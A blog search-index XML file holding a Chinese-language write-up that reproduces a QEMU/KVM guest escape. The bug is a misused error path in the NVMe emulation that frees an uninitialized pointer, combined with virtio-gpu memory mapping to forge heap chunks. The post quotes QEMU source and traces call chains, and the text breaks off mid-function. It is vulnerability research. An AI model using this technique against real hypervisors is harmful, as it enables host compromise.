<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Misuse Error Handling Leading To QEMU/KVM Escape</title>
    <link href="/2023/10/12/ErrorHandling/"/>
    <url>/2023/10/12/ErrorHandling/</url>
    
    <content type="html"><![CDATA[<p>这里复现《Scavenger：Misuse Error Handling Leading To QEMU&#x2F;KVM Escape》，虽然没有CVE，但也是确确实实存在过可以利用的漏洞。</p><p>具体参考：<a href="https://zhuanlan.zhihu.com/p/373084566">https://zhuanlan.zhihu.com/p/373084566</a>  、 <a href="https://github.com/hustdebug/scavenger">https://github.com/hustdebug/scavenger</a></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h3><p>在<a href="https://elixir.bootlin.com/qemu/v4.2.1/source/hw/block/nvme.c#L141">nvme_map_prp函数</a>中运行到pci_dma_sglist_init 有<code>qsg-&gt;sg = g_malloc(alloc_hint * sizeof(ScatterGatherEntry))</code>，为qsg-&gt;sg分配一个堆地址；接着运行到<code>if (unlikely(!prp2))</code>时，prp2为0，通过判断直接跳转到unmap去执行qemu_sglist_destroy函数， qemu_sglist_destroy函数中有<code>g_free(qsg-&gt;sg)</code>释放堆内存。但是运行到的是qemu_iovec_init函数，qsg-&gt;sg中就是一个未初始化的值，接着跳转到unmap去执行qemu_sglist_destroy函数也会释放这个未初始化的值，如果这个未初始化的值是一块可供虚拟机直接读写的内存地址就可以对漏洞进一步利用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">uint16_t</span> <span class="hljs-title function_">nvme_map_prp</span><span class="hljs-params">(QEMUSGList *qsg, QEMUIOVector *iov, <span class="hljs-type">uint64_t</span> prp1,</span><br><span class="hljs-params">                             <span class="hljs-type">uint64_t</span> prp2, <span class="hljs-type">uint32_t</span> len, NvmeCtrl *n)</span><br>&#123;<br>    hwaddr trans_len = n-&gt;page_size - (prp1 % n-&gt;page_size);<br>    trans_len = MIN(len, trans_len);<br>    <span class="hljs-type">int</span> num_prps = (len &gt;&gt; n-&gt;page_bits) + <span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">if</span> (unlikely(!prp1)) &#123;<br>        trace_nvme_err_invalid_prp();<br>        <span class="hljs-keyword">return</span> NVME_INVALID_FIELD | NVME_DNR;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (n-&gt;cmbsz &amp;&amp; prp1 &gt;= n-&gt;ctrl_mem.addr &amp;&amp;<br>               prp1 &lt; n-&gt;ctrl_mem.addr + int128_get64(n-&gt;ctrl_mem.size)) &#123;<br>        qsg-&gt;nsg = <span class="hljs-number">0</span>;<br>        qemu_iovec_init(iov, num_prps);<br>        qemu_iovec_add(iov, (<span class="hljs-type">void</span> *)&amp;n-&gt;cmbuf[prp1 - n-&gt;ctrl_mem.addr], trans_len);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        pci_dma_sglist_init(qsg, &amp;n-&gt;parent_obj, num_prps);<br>        qemu_sglist_add(qsg, prp1, trans_len);<br>    &#125;<br>    len -= trans_len;<br>    <span class="hljs-keyword">if</span> (len) &#123;<br>        <span class="hljs-keyword">if</span> (unlikely(!prp2)) &#123;<br>            trace_nvme_err_invalid_prp2_missing();<br>            <span class="hljs-keyword">goto</span> unmap;<br>        &#125;<br>        ………………<br>        ………………<br>        <br>    &#125;<br>    <span class="hljs-keyword">return</span> NVME_SUCCESS;<br><br> unmap:<br>    qemu_sglist_destroy(qsg);<br>    <span class="hljs-keyword">return</span> NVME_INVALID_FIELD | NVME_DNR;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">qemu_sglist_destroy</span><span class="hljs-params">(QEMUSGList *qsg)</span><br>&#123;<br>    object_unref(OBJECT(qsg-&gt;dev));<br>    g_free(qsg-&gt;sg);<br>    <span class="hljs-built_in">memset</span>(qsg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(*qsg));<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来就完全参考Gaoning大佬的思路做出的分析，建议直接看开头推荐的链接，自己这里写这篇文章纯粹是怕自己遗忘。</p><h3 id="确定上层函数"><a href="#确定上层函数" class="headerlink" title="确定上层函数"></a>确定上层函数</h3><p>nvme_map_prp的上层调用有三个函数：nvme_dma_write_prp、nvme_dma_read_prp和nvme_rw。</p><p>nvme_dma_write_prp和nvme_dma_read_prp中的qsg都是栈上的变量，存在于栈上的数据导致无法去控制qsg-&gt;sg中的未初始化变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">uint16_t</span> <span class="hljs-title function_">nvme_dma_write_prp</span><span class="hljs-params">(NvmeCtrl *n, <span class="hljs-type">uint8_t</span> *ptr, <span class="hljs-type">uint32_t</span> len,</span><br><span class="hljs-params">                                   <span class="hljs-type">uint64_t</span> prp1, <span class="hljs-type">uint64_t</span> prp2)</span><br>&#123;<br>………………<br>    ………………<br>    <span class="hljs-keyword">if</span> (nvme_map_prp(&amp;qsg, &amp;iov, prp1, prp2, len, n)) &#123;<br>        <span class="hljs-keyword">return</span> NVME_INVALID_FIELD | NVME_DNR;<br>    &#125;<br>………………<br>    ………………<br>    <span class="hljs-keyword">return</span> status;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后的nvme_rw中的qsg就是存在于堆上的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">nvme_process_sq</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque)</span><br>&#123;<br>………………<br>    ………………<br>    <span class="hljs-keyword">while</span> (!(nvme_sq_empty(sq) || QTAILQ_EMPTY(&amp;sq-&gt;req_list))) &#123;<br>        addr = sq-&gt;dma_addr + sq-&gt;head * n-&gt;sqe_size;<br>        nvme_addr_read(n, addr, (<span class="hljs-type">void</span> *)&amp;cmd, <span class="hljs-keyword">sizeof</span>(cmd));<br>        nvme_inc_sq_head(sq);<br><br>        req = QTAILQ_FIRST(&amp;sq-&gt;req_list);<br>        QTAILQ_REMOVE(&amp;sq-&gt;req_list, req, entry);<br>        QTAILQ_INSERT_TAIL(&amp;sq-&gt;out_req_list, req, entry);<br>        <span class="hljs-built_in">memset</span>(&amp;req-&gt;cqe, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(req-&gt;cqe));<br>        req-&gt;cqe.cid = cmd.cid;<br><br>        status = sq-&gt;sqid ? nvme_io_cmd(n, &amp;cmd, req) :<br>            nvme_admin_cmd(n, &amp;cmd, req);<br>………………<br>    ………………<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">uint16_t</span> <span class="hljs-title function_">nvme_io_cmd</span><span class="hljs-params">(NvmeCtrl *n, NvmeCmd *cmd, NvmeRequest *req)</span><br>&#123;<br>………………<br>    ………………<br>    <span class="hljs-keyword">case</span> NVME_CMD_READ:<br>        <span class="hljs-keyword">return</span> nvme_rw(n, ns, cmd, req);<br>    <span class="hljs-keyword">default</span>:<br>        trace_nvme_err_invalid_opc(cmd-&gt;opcode);<br>        <span class="hljs-keyword">return</span> NVME_INVALID_OPCODE | NVME_DNR;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">uint16_t</span> <span class="hljs-title function_">nvme_rw</span><span class="hljs-params">(NvmeCtrl *n, NvmeNamespace *ns, NvmeCmd *cmd,</span><br><span class="hljs-params">    NvmeRequest *req)</span><br>&#123;<br>………………<br>    ………………<br>    <span class="hljs-keyword">if</span> (nvme_map_prp(&amp;req-&gt;qsg, &amp;req-&gt;iov, prp1, prp2, data_size, n)) &#123;<br>        block_acct_invalid(blk_get_stats(n-&gt;conf.blk), acct);<br>        <span class="hljs-keyword">return</span> NVME_INVALID_FIELD | NVME_DNR;<br>    &#125;<br>………………<br>    ………………<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="跨域攻击"><a href="#跨域攻击" class="headerlink" title="跨域攻击"></a>跨域攻击</h3><p>virtio_gpu_create_mapping_iov函数中dma_memory_map将虚拟机物理内存映射qemu中的分配给虚拟机真实内存，(*iov)[i].iov_base中的地址就是分配给虚拟机的地址，虚拟机可以直接对其读写</p><img src="/img/22/Screenshot 2023-10-18 152610.png" style="zoom:80%;" /><p>在*iov释放后，接着被qsg申请，利用残留的地址，使用上面的漏洞去释放该内存，在虚拟机中可以直接对该内存读写，就可以很方便地去伪造chunk、泄漏信息，仅仅通过在虚拟机中的读写内存，进而跨域影响到qemu。</p><h2 id="相关函数的调用"><a href="#相关函数的调用" class="headerlink" title="相关函数的调用"></a>相关函数的调用</h2><p>知道需要使用virtio_gpu_create_mapping_iov函数去设置Mapping Table后，接下来就要搞清楚怎样去调用它。</p><p>当时我尝试自己去找上层调用链，和之前一样最后找到virtio_gpu_ctrl_bh这个底半部（bottom half）函数，通过virtio_gpu_handle_ctrl_cb就可以触发</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">virtio_gpu_handle_ctrl_cb</span><span class="hljs-params">(VirtIODevice *vdev, VirtQueue *vq)</span><br>&#123;<br>    VirtIOGPU *g = VIRTIO_GPU(vdev);<br>    qemu_bh_schedule(g-&gt;ctrl_bh);<br>&#125;<br></code></pre></td></tr></table></figure><p>但是在virtio-gpu.c这个文件中根本就找不到virtio_gpu_handle_ctrl_cb的上层函数，也找不到设备注册的相关函数，当时直接自闭，最后是参考Gaoning大佬的<a href="https://github.com/hustdebug/scavenger/blob/main/exploit/exp.c">exp</a>中设置的参数才搞明白（事后诸葛🤡）。</p><p>virtio_gpu_device_realize中会调用virtio_gpu_base_device_realize函数，一开始我还以为这个函数跟virtio_gpu_handle_ctrl_cb的调用没多大关系，但是进入virtio_gpu_base_device_realize函数后进一步调用virtio_add_queue函数，在virtio_add_queue函数中会将virtio_gpu_handle_ctrl_cb函数的地址赋值给<code>vdev-&gt;vq[i].handle_output</code>，也就是后续virtio_gpu_handle_ctrl_cb的调用可以通过<code>vdev-&gt;vq[i].handle_output</code>去触发。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">virtio_gpu_device_realize</span><span class="hljs-params">(DeviceState *qdev, Error **errp)</span><br>&#123;<br>………………<br>    ………………<br><br>    <span class="hljs-keyword">if</span> (!virtio_gpu_base_device_realize(qdev,<br>                                        virtio_gpu_handle_ctrl_cb,<br>                                        virtio_gpu_handle_cursor_cb,<br>                                        errp)) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    g-&gt;ctrl_vq = virtio_get_queue(vdev, <span class="hljs-number">0</span>);<br>    g-&gt;cursor_vq = virtio_get_queue(vdev, <span class="hljs-number">1</span>);<br>    g-&gt;ctrl_bh = qemu_bh_new(virtio_gpu_ctrl_bh, g);<br>    g-&gt;cursor_bh = qemu_bh_new(virtio_gpu_cursor_bh, g);<br>    QTAILQ_INIT(&amp;g-&gt;reslist);<br>    QTAILQ_INIT(&amp;g-&gt;cmdq);<br>    QTAILQ_INIT(&amp;g-&gt;fenceq);<br>&#125;<br><br><span class="hljs-type">bool</span><br><span class="hljs-title function_">virtio_gpu_base_device_realize</span><span class="hljs-params">(DeviceState *qdev,</span><br><span class="hljs-params">                               VirtIOHandleOutput ctrl_cb,</span><br><span class="hljs-params">                               VirtIOHandleOutput cursor_cb,</span><br><span class="hljs-params">                               Error **errp)</span><br>&#123;<br>………………<br>    ………………<br>    <span class="hljs-keyword">if</span> (virtio_gpu_virgl_enabled(g-&gt;conf)) &#123;<br>        <span class="hljs-comment">/* use larger control queue in 3d mode */</span><br>        virtio_add_queue(vdev, <span class="hljs-number">256</span>, ctrl_cb);<br>        virtio_add_queue(vdev, <span class="hljs-number">16</span>, cursor_cb);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        virtio_add_queue(vdev, <span class="hljs-number">64</span>, ctrl_cb);<br>        virtio_add_queue(vdev, <span class="hljs-number">16</span>, cursor_cb);<br>    &#125;<br>………………<br>    ………………<br><br>&#125;<br><br>VirtQueue *<span class="hljs-title function_">virtio_add_queue</span><span class="hljs-params">(VirtIODevice *vdev, <span class="hljs-type">int</span> queue_size,</span><br><span class="hljs-params">                            VirtIOHandleOutput handle_output)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; VIRTIO_QUEUE_MAX; i++) &#123;<br>        <span class="hljs-keyword">if</span> (vdev-&gt;vq[i].vring.num == <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (i == VIRTIO_QUEUE_MAX || queue_size &gt; VIRTQUEUE_MAX_SIZE)<br>        <span class="hljs-built_in">abort</span>();<br><br>    vdev-&gt;vq[i].vring.num = queue_size;<br>    vdev-&gt;vq[i].vring.num_default = queue_size;<br>    vdev-&gt;vq[i].vring.align = VIRTIO_PCI_VRING_ALIGN;<br>    vdev-&gt;vq[i].handle_output = handle_output;<br>    vdev-&gt;vq[i].handle_aio_output = <span class="hljs-literal">NULL</span>;<br>    vdev-&gt;vq[i].used_elems = g_malloc0(<span class="hljs-keyword">sizeof</span>(VirtQueueElement) *<br>                                       queue_size);<br><br>    <span class="hljs-keyword">return</span> &amp;vdev-&gt;vq[i];<br>&#125;<br></code></pre></td></tr></table></figure><p>在hw&#x2F;virtio&#x2F;virtio-pci.c中的virtio_pci_notify_write函数调用virtio_queue_notify，接着调用<code>vq-&gt;handle_output(vdev, vq)</code>就可以进入virtio_gpu_handle_ctrl_cb函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">virtio_pci_notify_write</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr,</span><br><span class="hljs-params">                                    <span class="hljs-type">uint64_t</span> val, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    VirtIODevice *vdev = opaque;<br>    VirtIOPCIProxy *proxy = VIRTIO_PCI(DEVICE(vdev)-&gt;parent_bus-&gt;parent);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-built_in">queue</span> = addr / virtio_pci_queue_mem_mult(proxy);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">queue</span> &lt; VIRTIO_QUEUE_MAX) &#123;<br>        virtio_queue_notify(vdev, <span class="hljs-built_in">queue</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">virtio_queue_notify</span><span class="hljs-params">(VirtIODevice *vdev, <span class="hljs-type">int</span> n)</span><br>&#123;<br>    VirtQueue *vq = &amp;vdev-&gt;vq[n];<br><br>    <span class="hljs-keyword">if</span> (unlikely(!vq-&gt;vring.desc || vdev-&gt;broken)) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    trace_virtio_queue_notify(vdev, vq - vdev-&gt;vq, vq);<br>    <span class="hljs-keyword">if</span> (vq-&gt;host_notifier_enabled) &#123;<br>        event_notifier_set(&amp;vq-&gt;host_notifier);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (vq-&gt;handle_output) &#123;<br>        vq-&gt;handle_output(vdev, vq);<br><br>        <span class="hljs-keyword">if</span> (unlikely(vdev-&gt;start_on_kick)) &#123;<br>            virtio_set_started(vdev, <span class="hljs-literal">true</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在virtio-pci.c中可以很容易去找到设备的注册和读写函数。</p><p>​                                              </p><p>之后进入virtio_gpu_handle_ctrl函数就会调用virtqueue_pop来得到cmd，在virtqueue_pop中进一步调用virtqueue_split_pop</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">virtio_gpu_handle_ctrl</span><span class="hljs-params">(VirtIODevice *vdev, VirtQueue *vq)</span><br>&#123;<br>………………<br>    ………………<br>    cmd = virtqueue_pop(vq, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> virtio_gpu_ctrl_command));<br>    <span class="hljs-keyword">while</span> (cmd) &#123;<br>        cmd-&gt;vq = vq;<br>        cmd-&gt;error = <span class="hljs-number">0</span>;<br>        cmd-&gt;finished = <span class="hljs-literal">false</span>;<br>        QTAILQ_INSERT_TAIL(&amp;g-&gt;cmdq, cmd, next);<br>        cmd = virtqueue_pop(vq, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> virtio_gpu_ctrl_command));<br>    &#125;<br><br>    virtio_gpu_process_cmdq(g);<br>………………<br>    ………………<br>&#125;<br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">virtqueue_pop</span><span class="hljs-params">(VirtQueue *vq, <span class="hljs-type">size_t</span> sz)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (unlikely(vq-&gt;vdev-&gt;broken)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (virtio_vdev_has_feature(vq-&gt;vdev, VIRTIO_F_RING_PACKED)) &#123;<br>        <span class="hljs-keyword">return</span> virtqueue_packed_pop(vq, sz);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> virtqueue_split_pop(vq, sz);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>virtqueue_split_pop函数就是设置Mapping Table中数据的关键函数，主要将vq-&gt;vring-&gt;desc虚拟机物理地址中的VirtIODevice结构体经过一些判断处理后赋值给elem，具体看源码和注释：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">virtqueue_split_pop</span><span class="hljs-params">(VirtQueue *vq, <span class="hljs-type">size_t</span> sz)</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i, head, max;<br>    VRingMemoryRegionCaches *caches;<br>    MemoryRegionCache indirect_desc_cache = MEMORY_REGION_CACHE_INVALID;<br>    MemoryRegionCache *desc_cache;<br>    <span class="hljs-type">int64_t</span> len;<br>    VirtIODevice *vdev = vq-&gt;vdev;<br>    VirtQueueElement *elem = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">unsigned</span> out_num, in_num, elem_entries;<br>    hwaddr addr[VIRTQUEUE_MAX_SIZE];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">iov</span>[<span class="hljs-title">VIRTQUEUE_MAX_SIZE</span>];</span><br>    VRingDesc desc;<br>    <span class="hljs-type">int</span> rc;<br><br>    RCU_READ_LOCK_GUARD();<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    virtio_queue_empty_rcu函数判断队列是否为空， 函数具体判断vq-&gt;shadow_avail_idx和vq-&gt;last_avail_idx是否相等，</span><br><span class="hljs-comment">    不相等返回0；如果相等，继续使用vring_avail_idx函数更新shadow_avail_idx的值，不相等返回0，相等返回1。</span><br><span class="hljs-comment">    shadow_avail_idx的值是从(vq-&gt;vring-&gt;avail + offsetof(VRingAvail, idx))虚拟机物理地址中获取。</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-keyword">if</span> (virtio_queue_empty_rcu(vq)) &#123;<br>        <span class="hljs-keyword">goto</span> done;<br>    &#125;<br>    <span class="hljs-comment">/* Needed after virtio_queue_empty(), see comment in</span><br><span class="hljs-comment">     * virtqueue_num_heads(). */</span><br>    smp_rmb();<br><br>    <span class="hljs-comment">/* When we start there are none of either input nor output. */</span><br>    out_num = in_num = elem_entries = <span class="hljs-number">0</span>;<br><br>    max = vq-&gt;vring.num;<br><br>    <span class="hljs-keyword">if</span> (vq-&gt;inuse &gt;= vq-&gt;vring.num) &#123;<br>        virtio_error(vdev, <span class="hljs-string">&quot;Virtqueue size exceeded&quot;</span>);<br>        <span class="hljs-keyword">goto</span> done;<br>    &#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">virtqueue_get_head函数获取队列的头部引索值，head的值从(vq-&gt;vring-&gt;avail + offsetof(VRingAvail, ring[vq-&gt;last_avail_idx]))</span><br><span class="hljs-comment">虚拟机物理地址中获取</span><br><span class="hljs-comment">*/</span><br>    <span class="hljs-keyword">if</span> (!virtqueue_get_head(vq, vq-&gt;last_avail_idx++, &amp;head)) &#123;<br>        <span class="hljs-keyword">goto</span> done;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (virtio_vdev_has_feature(vdev, VIRTIO_RING_F_EVENT_IDX)) &#123;<br>        vring_set_avail_event(vq, vq-&gt;last_avail_idx);<br>    